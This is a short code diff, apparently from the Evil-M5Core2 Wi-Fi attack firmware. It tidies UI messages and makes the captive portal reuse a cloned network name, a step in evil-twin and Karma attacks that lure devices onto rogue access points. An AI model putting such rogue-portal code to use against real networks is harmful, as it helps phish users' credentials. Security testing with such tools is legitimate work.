@@ -961,7 +961,7 @@ void showWifiList(CallbackMenuItem& menuItem) {
             sendMessage("-------------------");
             sendMessage("SSID " +ssidList[currentListIndex] + " selected");
             sendMessage("-------------------");
-            ui.waitAndReturnToMenu(ssidList[currentListIndex] + "\n      selected");
+            ui.waitAndReturnToMenu(ssidList[currentListIndex] + " selected");
         }
     }
 }
@@ -1058,8 +1058,7 @@ String bssidToString(uint8_t* bssid) {
 }
 
 void createCaptivePortal(CallbackMenuItem& menuItem) {
-    //String ssid = clonedSSID.isEmpty() ? "Evil-M5Core2" : clonedSSID;
-    String ssid = "Evil-M5Core2";
+    String ssid = currentClonedSSID.isEmpty() ? "Evil-M5Core2" : currentClonedSSID;
     WiFi.mode(WIFI_MODE_APSTA);
     if (!isAutoKarmaActive){
         if (captivePortalPassword == ""){
@@ -1211,7 +1210,7 @@ void createCaptivePortal(CallbackMenuItem& menuItem) {
     led.pattern3();
 #endif
     if (!isProbeKarmaAttackMode && !isAutoKarmaActive) {
-        ui.waitAndReturnToMenu("     Portal\n        " + ssid + "\n        Deployed");
+        ui.waitAndReturnToMenu("Portal" + ssid + "Deployed");
     }
 }
 
